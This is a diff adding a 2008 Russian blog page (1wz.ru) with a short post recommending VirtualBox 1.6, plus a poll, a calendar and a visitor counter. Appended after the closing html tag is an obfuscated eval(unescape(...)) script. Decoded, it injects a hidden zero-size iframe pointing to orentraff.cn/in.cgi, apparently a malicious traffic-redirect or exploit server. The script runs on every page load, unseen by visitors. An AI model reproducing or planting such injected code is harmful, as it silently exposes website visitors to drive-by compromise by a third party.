+      <a href="http://1wz.ru/2008/05/04/virtualbox_1.6__windows_linux_i_macos_bez_ustanovki.html">VirtualBox 1.6 - Windows, Linux и MacOS без установки!</a> 
+   </td><td align="right"> 
+      <a href="http://1wz.ru/soft/">Программы</a> 
+   </td></tr></table> 
+   </div> 
+   <div class="news-2"></div> 
+</div>
+
+
+<div class="news2">
+	<table class="noname"><tr><td>
+		<div id='news-id-11879'><div align="center"><img src="http://1wz.ru/uploads/posts/1209911200_pic_id63096.jpeg" style="border: none;" alt='VirtualBox 1.6 - Windows, Linux и MacOS без установки!' /></div><br /><b>VirtualBox 1.6</b> - бесплатная виртуальная машина для Windows. Зачем она нужна?<br />Да всё просто! Вот вы хотите установить Windows Vista SP1, но не хотите пока удалять Windows. Понятное дело - попробовать, поиграться и уж только потом покупать. Так вот, <b>VirtualBox 1.6</b> позволит прямо из под Windows создать виртуальный компьютер, на который вы как на настоящий установите Vista или, например, Linux, а то и MacOS. C такой виртуальной системой можно делать всё что угодно - эксперементировать с драйверами, выделять под неё больше или меньше ресурсов, делать скриншоты...<br /><b>VirtualBox 1.6</b> - незаменимая для эксперементатора и тестировщика софта штука - сам пользуюсь уже почти год!</div>
+	</td></tr></table>
+</div>
+<div class="news3">
+	<div class="news3-1"><span id='ratig-layer-11879'><div class="rating" style="float:left;">
+		<ul class="unit-rating">
+		<li class="current-rating" style="width:0px;">0</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="dleRate('1', '11879'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="dleRate('2', '11879'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="dleRate('3', '11879'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="dleRate('4', '11879'); return false;">4</a></li>
+		<li><a href="#" title="Отлично" class="r5-unit" onclick="dleRate('5', '11879'); return false;">5</a></li>
+		</ul>
+</div></span></div>
+	<div class="news3-3"><a href="http://1wz.ru/2008/05/04/virtualbox_1.6__windows_linux_i_macos_bez_ustanovki.html"><img src="/templates/web20_2/images/rm.gif" /></a></div>
+	<div class="news3-2">
+	
+	
+		<img src="/templates/web20_2/images/user.gif" align="absmiddle" />&nbsp;<a href="http://1wz.ru/user/maxler/">maxler</a>&nbsp;-&nbsp;4 май 2008&nbsp;|&nbsp;Комментарии: <a href="http://1wz.ru/2008/05/04/virtualbox_1.6__windows_linux_i_macos_bez_ustanovki.html#comment">0</a>&nbsp;|&nbsp;Просмотров: 14
+	</div>
+</div><div align="center" style="margin-bottom: 11px;"><a href="http://1wz.ru/soft/page/1/">Вернуться назад</a>&nbsp; <<&nbsp; <a href="http://1wz.ru/soft/page/1/">1</a>  <span>2</span> <a href="http://1wz.ru/soft/page/3/">3</a>  ... <a href="http://1wz.ru/soft/page/223/">223</a> <a href="http://1wz.ru/soft/page/224/">224</a> <a href="http://1wz.ru/soft/page/225/">225</a>  &nbsp;>> &nbsp;<a href="http://1wz.ru/soft/page/3/">Следующая страница</a></div></div>
+    </td>
+    <td class="left">
+    <!-- Начало блока -->
+        <div class="block">
+        	<div class="block-1"><img src="/templates/web20_2/images/calendar.gif" align="absmiddle" />Опрос</div>
+            <div class="block-2"></div>
+        </div>
+        <div class="block2"><div align="center"><script type="text/javascript">
+function doVote( event ){
+
+    var frm = document.vote;
+	var vote_check = '';
+
+    for (var i=0;i < frm.elements.length;i++) {
+        var elmnt = frm.elements[i];
+        if (elmnt.type=='radio') {
+            if(elmnt.checked == true){ vote_check = elmnt.value; break;}
+        }
+    }
+
+	var ajax = new dle_ajax();
+	ajax.onShow ('');
+	var varsString = "";
+	ajax.setVar("vote_id", "5" );
+	ajax.setVar("vote_action", event);
+	ajax.setVar("vote_check", vote_check);
+	ajax.setVar("vote_skin", "web20_2");
+	ajax.requestFile = dle_root + "engine/ajax/vote.php";
+	ajax.method = 'GET';
+	ajax.element = 'vote-layer';
+	ajax.sendAJAX(varsString);
+}
+</script><div id='vote-layer'>
+<div style="margin-bottom:5px;">Как писать ссылки</div>
+<div class="mod"><form method="post" name="vote" action=''><div id="dle-vote"><div class="vote"><input name="vote_check" type="radio" checked value="0"> Заголовок ссылки - сама ссылка</div><div class="vote"><input name="vote_check" type="radio"  value="1"> Просто в текстовом виде</div><div class="vote"><input name="vote_check" type="radio"  value="2"> Заголовок - сервер откуда ссылка</div></div></div><div style="margin-top :5px;">
+<input type="hidden" name="vote_action" value="vote" />
+<input type="hidden" name="vote_id" id="vote_id" value="1" />
+<input type="button" class="bbcodes" onclick="doVote('vote'); return false;" value="Голосовать"/></form>
+
+<form method="post" name="vote_result" action=''>
+<input type="hidden" name="vote_action" value="results" />
+<input type="hidden" name="vote_id" value="1" />
+<input type="button" class="bbcodes" onclick="doVote('results'); return false;" value="Результаты" /></form></div>
+
+</div></div></div>
+        <div class="block3"><div class="block3-1"></div><div class="block3-2"></div></div>
+    
+    
+
+
+       <!-- Начало блока -->
+        <div class="block">
+        	<div class="block-1"><img src="/templates/web20_2/images/calendar.gif" align="absmiddle" />Календарь</div>
+            <div class="block-2"></div>
+        </div>
+        <div class="block2"><div align="center"><div id="calendar-layer"><table id="calendar" cellpadding="3" class="calendar"><thead><th colspan="7"><center><b><a class="monthlink" onClick="doCalendar('04','2008'); return false;" href="http://1wz.ru/2008/04/" title="Предыдущий месяц">&laquo;</a>&nbsp;&nbsp;&nbsp;&nbsp;май 2008&nbsp;&nbsp;&nbsp;&nbsp;<a class="monthlink" onClick="doCalendar('06','2008'); return false;" href="http://1wz.ru/2008/06/" title="Следующий месяц">&raquo;</a></b></center></th></thead><thead><th>Пн</th><th>Вт</th><th>Ср</th><th>Чт</th><th>Пт</th><th class="weekday">Сб</th><th class="weekday">Вс</th></thead><tr><td colspan="3">&nbsp;</td><td class="day-active-v"><a class="day-active-v" href="http://1wz.ru/2008/05/01/" title="Все посты за 01 май 2008"><center>1</center></a></td><td class="day-active-v"><a class="day-active-v" href="http://1wz.ru/2008/05/02/" title="Все посты за 02 май 2008"><center>2</center></a></td><td class="day-active"><a class="day-active" href="http://1wz.ru/2008/05/03/" title="Все посты за 03 май 2008"><center>3</center></a></td><td class="day-active"><a class="day-active" href="http://1wz.ru/2008/05/04/" title="Все посты за 04 май 2008"><center>4</center></a></td></tr><tr><td class="day-active-v"><a class="day-active-v" href="http://1wz.ru/2008/05/05/" title="Все посты за 05 май 2008"><center>5</center></a></td><td class="day-active-v"><a class="day-active-v" href="http://1wz.ru/2008/05/06/" title="Все посты за 06 май 2008"><center>6</center></a></td><td class="day-active-v"><a class="day-active-v" href="http://1wz.ru/2008/05/07/" title="Все посты за 07 май 2008"><center>7</center></a></td><td class="day-active-v"><a class="day-active-v" href="http://1wz.ru/2008/05/08/" title="Все посты за 08 май 2008"><center>8</center></a></td><td class="day-active-v"><a class="day-active-v" href="http://1wz.ru/2008/05/09/" title="Все посты за 09 май 2008"><center>9</center></a></td><td class="weekday"><center>10</center></td><td class="weekday"><center>11</center></td></tr><tr><td class="day"><center>12</center></td><td class="day"><center>13</center></td><td class="day"><center>14</center></td><td class="day"><center>15</center></td><td class="day"><center>16</center></td><td class="weekday"><center>17</center></td><td class="weekday"><center>18</center></td></tr><tr><td class="day"><center>19</center></td><td class="day"><center>20</center></td><td class="day"><center>21</center></td><td class="day"><center>22</center></td><td class="day"><center>23</center></td><td class="weekday"><center>24</center></td><td class="weekday"><center>25</center></td></tr><tr><td class="day"><center>26</center></td><td class="day"><center>27</center></td><td class="day"><center>28</center></td><td class="day"><center>29</center></td><td class="day"><center>30</center></td><td class="weekday"><center>31</center></td><td colspan="1">&nbsp;</td></tr></table></div></div></div>
+        <div class="block3"><div class="block3-1"></div><div class="block3-2"></div></div>
+ 
+          <!-- Начало блока -->
+        <div class="block">
+        	<div class="block-1"><img src="/templates/web20_2/images/calendar.gif" align="absmiddle" />Обмен ссылками</div>
+            <div class="block-2"></div>
+        </div>
+        <div class="block2"><div align="center"></div></div>
+        <div class="block3"><div class="block3-1"></div><div class="block3-2"></div></div>
+
+    
+    
+    
+    
+    </td>
+</tr></table>
+</div>
+<div id="footer">
+	<div class="fl">
+    	
+<noindex>
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t52.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet: показано число просмотров и"+
+" посетителей за 24 часа' "+
+"border=0 width=88 height=31><\/a>")//--></script><!--/LiveInternet-->
+</noindex>
+
+
+
+
+
+
+
+
+        
+
+
+    </div>
+    <div class="fr">
+	Всё нах нарушено. Copyright &copy; 2007 <a href="http://1wz.ru">1wz.ru</a><br />
+    
+    </div> 
+</div>
+
+
+
+
+
+
+
+</body>
+</html><!-- ~ --><script type="text/javascript">
+eval(unescape("%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%27%5C%75%30%30%33%63%5C%75%30%30%36%39%5C%75%30%30%36%36%5C%75%30%30%37%32%5C%75%30%30%36%31%5C%75%30%30%36%64%5C%75%30%30%36%35%5C%75%30%30%32%30%5C%75%30%30%37%33%5C%75%30%30%37%32%5C%75%30%30%36%33%5C%75%30%30%33%64%5C%75%30%30%32%32%5C%75%30%30%36%38%5C%75%30%30%37%34%5C%75%30%30%37%34%5C%75%30%30%37%30%5C%75%30%30%33%61%5C%75%30%30%32%66%5C%75%30%30%32%66%5C%75%30%30%36%66%5C%75%30%30%37%32%5C%75%30%30%36%35%5C%75%30%30%36%65%5C%75%30%30%37%34%5C%75%30%30%37%32%5C%75%30%30%36%31%5C%75%30%30%36%36%5C%75%30%30%36%36%5C%75%30%30%32%65%5C%75%30%30%36%33%5C%75%30%30%36%65%5C%75%30%30%32%66%5C%75%30%30%36%39%5C%75%30%30%36%65%5C%75%30%30%32%65%5C%75%30%30%36%33%5C%75%30%30%36%37%5C%75%30%30%36%39%5C%75%30%30%33%66%5C%75%30%30%33%35%5C%75%30%30%32%32%5C%75%30%30%32%30%5C%75%30%30%37%37%5C%75%30%30%36%39%5C%75%30%30%36%34%5C%75%30%30%37%34%5C%75%30%30%36%38%5C%75%30%30%33%64%5C%75%30%30%32%32%5C%75%30%30%33%30%5C%75%30%30%32%32%5C%75%30%30%32%30%5C%75%30%30%36%38%5C%75%30%30%36%35%5C%75%30%30%36%39%5C%75%30%30%36%37%5C%75%30%30%36%38%5C%75%30%30%37%34%5C%75%30%30%33%64%5C%75%30%30%32%32%5C%75%30%30%33%30%5C%75%30%30%32%32%5C%75%30%30%32%30%5C%75%30%30%37%33%5C%75%30%30%37%34%5C%75%30%30%37%39%5C%75%30%30%36%63%5C%75%30%30%36%35%5C%75%30%30%33%64%5C%75%30%30%32%32%5C%75%30%30%36%34%5C%75%30%30%36%39%5C%75%30%30%37%33%5C%75%30%30%37%30%5C%75%30%30%36%63%5C%75%30%30%36%31%5C%75%30%30%37%39%5C%75%30%30%33%61%5C%75%30%30%36%65%5C%75%30%30%36%66%5C%75%30%30%36%65%5C%75%30%30%36%35%5C%75%30%30%32%32%5C%75%30%30%33%65%5C%75%30%30%33%63%5C%75%30%30%32%66%5C%75%30%30%36%39%5C%75%30%30%36%36%5C%75%30%30%37%32%5C%75%30%30%36%31%5C%75%30%30%36%64%5C%75%30%30%36%35%5C%75%30%30%33%65%27%29%3B"));
+</script><!-- ~ -->
